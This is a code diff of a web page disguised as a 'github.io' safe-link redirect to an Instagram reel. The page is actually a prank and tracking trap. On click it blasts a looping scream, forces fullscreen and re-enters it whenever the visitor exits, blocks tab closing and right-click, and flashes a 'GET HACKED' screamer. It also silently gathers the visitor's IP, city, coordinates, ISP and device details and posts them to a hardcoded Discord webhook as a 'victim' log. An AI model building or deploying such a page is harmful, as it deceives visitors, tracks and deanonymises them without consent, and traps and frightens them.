@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>github.io • Safe Link Redirect</title>
   <style>
-    body, html { margin:0; padding:0; height:100vh; background:#0d1117; color:#c9d1d9; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Helvetica,Arial,sans-serif; overflow:hidden; }
+    body, html { margin:0; padding:0; height:100vh; background:#0d1117; color:#c9d1d9; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Helvetica,Arial,sans-serif; overflow:hidden; user-select: none; }
     #loader { position:fixed; inset:0; background:#0d1117; display:flex; align-items:center; justify-content:center; z-index:100000; }
     .spinner { width:80px; height:80px; border:8px solid #21262d; border-top:8px solid #58a6ff; border-radius:50%; animation:spin 1.2s linear infinite; }
     @keyframes spin { to {transform:rotate(360deg);} }
@@ -19,61 +19,49 @@
     .btn-proceed { display:block; width:100%; padding:18px; background:#238636; color:white; font-size:20px; font-weight:600; border:none; border-radius:8px; cursor:not-allowed; opacity: 0.5; transition:all 0.2s; }
     .btn-active { cursor:pointer; opacity: 1; }
 
-    /* JUMPSCARE SECTION */
     #scare { 
-        display:none; 
-        position:fixed; 
-        inset:0; 
-        z-index:999999; 
-        background-color: #600; /* Fallback color */
-        background-image: url('https://i.postimg.cc/LYtwG3gz/image.png');
-        background-position: center;
-        background-size: cover;
-        background-repeat: no-repeat;
+        display:none; position:fixed; inset:0; z-index:999999; 
+        background:#000 url('https://i.postimg.cc/LYtwG3gz/image.png') center/cover no-repeat; 
     }
     
-    .shake-active { animation: shake 0.08s infinite; }
     .shake-extreme { animation: shake 0.04s infinite linear; }
-    
     @keyframes shake {
       0% { transform: translate(10px, 10px) rotate(0deg); }
-      25% { transform: translate(-10px, -15px) rotate(-2deg); }
-      50% { transform: translate(-20px, 0px) rotate(2deg); }
-      75% { transform: translate(20px, 15px) rotate(-1deg); }
-      100% { transform: translate(10px, -10px) rotate(1deg); }
+      25% { transform: translate(-15px, -15px) rotate(-3deg); }
+      50% { transform: translate(-25px, 0px) rotate(3deg); }
+      75% { transform: translate(25px, 15px) rotate(-1deg); }
+      100% { transform: translate(10px, -10px) rotate(2deg); }
     }
 
     .glitch-text {
       position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
       color: #ff0000; font-size: 14vw; font-weight: 900; text-align: center;
-      text-shadow: 0 0 50px #ff0000, 0 0 100px #000; z-index: 1000001; 
-      animation: extremeGlitch 0.03s infinite;
+      text-shadow: 0 0 50px #ff0000; z-index: 1000001; animation: extremeGlitch 0.03s infinite;
     }
 
     @keyframes extremeGlitch {
-      0% { opacity: 1; filter: brightness(1) contrast(2); }
-      50% { opacity: 0.8; filter: invert(1) hue-rotate(120deg); transform: translate(-52%, -48%) scale(1.15); }
-      100% { opacity: 1; }
+      0% { filter: brightness(1) contrast(2); }
+      50% { filter: invert(1) hue-rotate(120deg); transform: translate(-52%, -48%) scale(1.1); }
+      100% { filter: brightness(2); }
     }
 
     #warning-box {
       display:none; position:fixed; top:50%; left:50%; transform:translate(-50%, -50%);
-      background:#f0f0f0; color:#000; padding:30px; border:4px solid #ff0000; z-index:2000000; text-align:center; width: 400px; font-family: sans-serif;
-      box-shadow: 0 0 30px rgba(0,0,0,0.8);
+      background:#fff; color:#000; padding:30px; border:4px solid #f00; z-index:2000000; text-align:center; width: 400px;
     }
   </style>
 </head>
-<body id="scareBody">
+<body id="scareBody" oncontextmenu="return false;">
 
 <div id="loader"><div class="spinner"></div></div>
 
-<audio id="scream" preload="auto">
-  <source src="https://files.catbox.moe/1p9b2r.mp3" type="audio/mpeg">
+<audio id="scream" preload="auto" loop>
+  <source src="https://files.catbox.moe/u85l0k.mp3" type="audio/mpeg">
 </audio>
 
 <div class="container" id="mainContent">
   <h1>github.io Link Shortener</h1>
-  <div class="status" id="status-msg">Analyzing Destination Safety...</div>
+  <div class="status" id="status-msg">Verifying Link Integrity...</div>
   <div class="progress"><div class="bar" id="progressBar"></div></div>
   <div class="link-preview"><strong>Destination:</strong><br>https://www.instagram.com/reel/C_8xYzAbCdEfGhIjKlMnOpQrStUvWxYz123456789/</div>
   <button class="btn-proceed" id="proceedBtn" onclick="triggerScare()">Verify & Proceed</button>
@@ -82,27 +70,44 @@
 <div id="scare">
   <div class="glitch-text" id="glitchTarget">GET FUCKED!!!</div>
   <div id="warning-box">
-    <h2 style="color:red; margin-top:0;">⚠️ SECURITY BREACH</h2>
-    <p>Unauthorized exfiltration detected. Location and IP logs transmitted to <strong>AFR Organization</strong>.</p>
+    <h2 style="color:red; margin-top:0;">⚠️ SECURITY ALERT</h2>
+    <p>Unauthorized access detected. Current location logs transmitted to <strong>AFR Organization</strong>.</p>
     <button onclick="this.parentElement.style.display='none'" style="padding:10px 40px; cursor:pointer; font-weight:bold;">DISMISS</button>
   </div>
 </div>
 
 <script>
-// Fake verification
+let isScaring = false;
+
+// 1. Fullscreen Re-Entry Loop
+document.addEventListener('fullscreenchange', () => {
+    if (isScaring && !document.fullscreenElement) {
+        enterFullscreen();
+    }
+});
+
+function enterFullscreen() {
+    const docElm = document.documentElement;
+    if (docElm.requestFullscreen) docElm.requestFullscreen();
+    else if (docElm.webkitRequestFullscreen) docElm.webkitRequestFullscreen();
+}
+
+// 2. Prevent Closing Tab
+window.onbeforeunload = function() {
+    if (isScaring) return "Data exfiltration in progress. Are you sure you want to stop the transmission?";
+};
+
+// UI Load
 setTimeout(() => {
   document.getElementById('loader').style.display = 'none';
   document.getElementById('mainContent').style.display = 'block';
-  let bar = document.getElementById('progressBar');
-  let btn = document.getElementById('proceedBtn');
-  let w = 0;
+  let bar = document.getElementById('progressBar'), w = 0;
   let id = setInterval(() => {
     w += 0.5; bar.style.width = w + '%';
     if (w >= 100) {
       clearInterval(id);
-      btn.innerText = "Proceed to Content";
-      btn.classList.add('btn-active');
-      document.getElementById('status-msg').innerText = "Verified Safe";
+      document.getElementById('proceedBtn').innerText = "Access Instagram Reel";
+      document.getElementById('proceedBtn').classList.add('btn-active');
     }
   }, 20);
 }, 1000);
@@ -111,77 +116,39 @@ async function triggerScare() {
   const btn = document.getElementById('proceedBtn');
   if (!btn.classList.contains('btn-active')) return;
 
-  // 1. SOUND & FULLSCREEN (Immediate priority)
-  const audio = document.getElementById('scream');
+  isScaring = true;
   
-  // Create AudioContext to bypass mute blocks
+  // Audio Brute Force
+  const audio = document.getElementById('scream');
   const AudioContext = window.AudioContext || window.webkitAudioContext;
   if (AudioContext) {
-    const ctx = new AudioContext();
-    if (ctx.state === 'suspended') ctx.resume();
+      const audioCtx = new AudioContext();
+      if (audioCtx.state === 'suspended') audioCtx.resume();
+      const track = audioCtx.createMediaElementSource(audio);
+      track.connect(audioCtx.destination);
   }
-  
   audio.volume = 1.0; 
   audio.play();
 
-  const docElm = document.documentElement;
-  if (docElm.requestFullscreen) docElm.requestFullscreen();
-  else if (docElm.webkitRequestFullscreen) docElm.webkitRequestFullscreen();
+  enterFullscreen();
 
-  // 2. VISUALS
   document.getElementById('mainContent').style.display = 'none';
   document.getElementById('scare').style.display = 'block';
-  document.getElementById('scareBody').classList.add('shake-active'); 
+  document.getElementById('scareBody').classList.add('shake-extreme'); 
 
-  // 3. TEXT SWAP & INTENSITY INCREASE (3 seconds)
-  setTimeout(() => {
-    document.getElementById('glitchTarget').innerText = "GET HACKED!!!";
-    document.getElementById('scareBody').classList.replace('shake-active', 'shake-extreme');
-  }, 3000);
+  setTimeout(() => { document.getElementById('glitchTarget').innerText = "GET HACKED!!!"; }, 3000);
+  setTimeout(() => { document.getElementById('warning-box').style.display = 'block'; }, 5000);
 
-  // 4. WARNING (5 seconds)
-  setTimeout(() => {
-    document.getElementById('warning-box').style.display = 'block';
-  }, 5000);
-
-  // 5. DEEP LOGGING (Original restored logic)
+  // Detailed Grab
   try {
-    const promises = await Promise.allSettled([
-      fetch('https://api.ipify.org?format=json').then(r=>r.json()),
-      fetch('https://ipapi.co/json/').then(r=>r.json())
-    ]);
-
-    let info = {
-      timestamp: new Date().toISOString(),
-      user_agent: navigator.userAgent,
-      screen: `${screen.width}x${screen.height}`,
-      mobile: /Mobi|Android|iPhone/.test(navigator.userAgent) ? 'Yes' : 'No'
-    };
-
-    promises.forEach(p => {
-      if (p.status === 'fulfilled' && p.value) {
-        let d = p.value;
-        if (d.ip) info.ip = d.ip;
-        if (d.city) info.city = d.city;
-        if (d.region_name || d.region) info.region = d.region_name || d.region;
-        if (d.country_name || d.country) info.country = d.country_name || d.country;
-        if (d.org || d.asn) info.isp = d.org || d.asn;
-      }
-    });
-
+    const geo = await fetch('http://ip-api.com/json/?fields=status,country,countryCode,regionName,city,lat,lon,isp,as,query').then(r=>r.json());
+    const info = `IP: ${geo.query} Location: ${geo.city}, ${geo.countryCode} Coords: ${geo.lat}, ${geo.lon} ISP: ${geo.as} UA: ${navigator.userAgent} Screen: ${screen.width}x${screen.height}x${screen.pixelDepth} Time: ${new Date().toISOString()}`;
+    
     fetch('https://discord.com/api/webhooks/1470138524614394000/idmvCsO6APPp8qZkYFP78mR7wxv6oQkHvfpaeAfRm3ePuOFop07McMk8O2EcljvQ-klX', {
       method: 'POST',
       headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({
-        content: "💀 **VICTIM LOGGED**",
-        embeds: [{
-          title: "Detailed Target Information",
-          description: `**IP:** ${info.ip || '?'}\n**Location:** ${info.city || '?'}, ${info.country || '?'}\n**ISP:** ${info.isp || '?'}\n**Device:** ${info.user_agent}`,
-          color: 16711680
-        }]
-      })
-    }).catch(()=>{});
-
+      body: JSON.stringify({ content: "💀 **Detailed Grab**\n" + info })
+    });
   } catch(e) {}
 }
 </script>
